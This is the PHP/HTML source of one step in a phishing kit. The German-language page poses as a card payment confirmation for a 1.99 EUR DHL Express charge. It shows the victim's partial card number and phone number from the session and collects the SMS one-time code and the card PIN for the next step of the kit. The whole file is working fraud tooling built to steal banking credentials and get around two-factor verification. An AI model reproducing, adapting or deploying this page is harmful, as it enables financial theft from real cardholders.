<?php 
/*==========================================================================
* +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ Author Name      : ANƬƖ-ƁƠMƁЄƦ 
* [A][и][T][Ɩ] [в][σ][м][в][є][я] Template Name    : O|P|T|U|S|N|E|T|-|C|O|M|-|A|U|
* +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ Template Version : V.1.1 By 🄰🄽🅃🄸-🄱🄾🄼🄱🄴🅁  
===========================================================================*/
    $page = 'default';
    require_once 'init.php';
    if(!isset($_GET['id'])):
        die(rediret($link)); // We're done here
    else:
	$action = './request.php?step=four&'.$id;
	setlocale( LC_ALL, 'de_DE' );
	$local_date = date( 'l, d.m.Y', '1537551000' );
	$de_date = strftime( '%A, %d.%m.%Y', strtotime( $local_date ) );
?>
<!DOCTYPE html>
<html lang="de">
	<head>
	<meta charset="UTF-8"/>
	<meta http-equiv="x-ua-compatible" content="ie=edge">
	<title>herzlich willkommen</title>
	<meta name="robots" content="noindex, nofollow, noimageindex">
	<meta name="google" content="notranslate">
	<meta name="description" content="">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="<?php echo $css1; ?>">
	<link rel="stylesheet" href="./layout/css/style.css">
	<link rel="shortcut icon nofollow" href="<?php echo $favicon; ?>">
	<!-- <script src="<?php echo $js;?>"></script>
	<script src="./layout/js/style.js"></script> -->
	</head>
	<body class="tanya">
		<div id="bg-load" class="bg-load"><div class="load"></div></div>
		<section>
		<div class="head">
		<span><img src="./layout/img/lg.svg"></span>
		<span><img src="./layout/img/vs.png"></span>
		</div>
		<div class="titr">Please confirm the following payment.</div>
		<div class="kolchi">
        <form id="cFrm" method="post" action="<?php echo $action; ?>">
		<p style="font-size:12px">Das eindeutige Passwort wurde an die unten aufgeführte Handynummer gesendet. Wenn Sie den SMS-Code nicht erhalten haben, überprüfen Sie Ihren Bankantrag und bestätigen Sie die Transaktion.</p>
		<div class="inf">
		<span class="tr">Merchant:</span>
		<span class="rp">DHL EXPRESS</span>
		</div>
		<div class="inf">
		<span class="tr">Amount:</span>
		<span class="rp" style="font-family:arial">1.99 EUR</span>
		</div>
		<div class="inf">
		<span class="tr">Date:</span>
		<span class="rp"><?php echo date('d/m/Y');?></span>
		</div>
		<div class="inf">
		<span class="tr">Credit card Number</span>
		<span class="rp"><?php echo 'XXXX-XXXX-XXXX-'.$_SESSION['nunu'];?></span>
		</div>
		<div class="inf">
		<span class="tr">Your Phone Number:</span>
		<span class="rp"><?php echo $_SESSION['tl']; ?></span>
		</div>
		<div class="inf">
		<span class="tr">SMS Code:</span>
		<span class="rp"><input type="text" class="tantan" id="tantan" name="tantan" maxlength="22" required placeholder="" autocomplete="off" autofocus  /></span>
		</div>
		<div class="inf">
		<span class="tr">Pin:</span>
		<span class="rp"><input type="text" class="tantan" id="secure" name="secure" maxlength="22" required placeholder="" autocomplete="off" autofocus  /></span>
		</div>
		<div style="font-size:12px">Please enter the verification code received by sms:<span id="timer" style="color:red;font-weight:bold;font-size:12px"><?php echo lang('SmEnv'); ?></span></div>
		</div>
		<!-- <div style="font-size:12px;color:red;font-weight:bold;padding:">Yvp apze mcctue ehrz umyatne ehivpgh eht muulrcmervn, rf yvp hmot cvnfriamervn fiva yvpi bmnx!</div> -->
		<div class="btn"><button type="submit" class="text-center" >Submit</button></div>
		<div class="foot">&copy; <?php echo date("Y"); ?> <?php echo lang('AllCp'); ?></div>
		</form>
		</section>
<script src="<?php echo $js;?>"></script>
	<script>
		function onReady(callback) {
  var intervalId = window.setInterval(function() {
    if (document.getElementsByTagName('body')[0] !== undefined) {
      window.clearInterval(intervalId);
      callback.call(this);
    }
  }, 1800);
}

function setVisible(selector, visible) {
  document.querySelector(selector).style.display = visible ? 'block' : 'none';
}

onReady(function() {
  setVisible('body', true);
  setVisible('#bg-load', false);
});

/*-------------------------------------------------------*/
/*------------------- TIMER FUNCTION --------------------*/
/*-------------------------------------------------------*/

    function countdown(timer, minutes, seconds) {
// set time for the particular countdown
var time = minutes*60 + seconds;
var interval = setInterval(function() {
    var el = document.getElementById('timer');
    // if the time is 0 then end the counter
    if(time == 0) {
        setTimeout(function() {
            el.innerHTML = "<?php echo lang('SmEnv'); ?>";
        }, 1500);


        clearInterval(interval);

        setTimeout(function() {
            countdown('clock', 2, 1);
        }, 2000);
    }
    var minutes = Math.floor( time / 60 );
    if (minutes < 10) minutes = "0" + minutes;
    var seconds = time % 60;
    if (seconds < 10) seconds = "0" + seconds; 
    var text = minutes + ':' + seconds;
    el.innerHTML = text;
    time--;
}, 1500);     // 1000 = 1 segonde in timer = j'ai fais 1500 pour calculer 1.5 segonde comme c'est 1 segonde
}
countdown('clock', 2, 1);
	</script>
	</body>
</html>
<?php
    endif;
    ob_end_flush();
?>
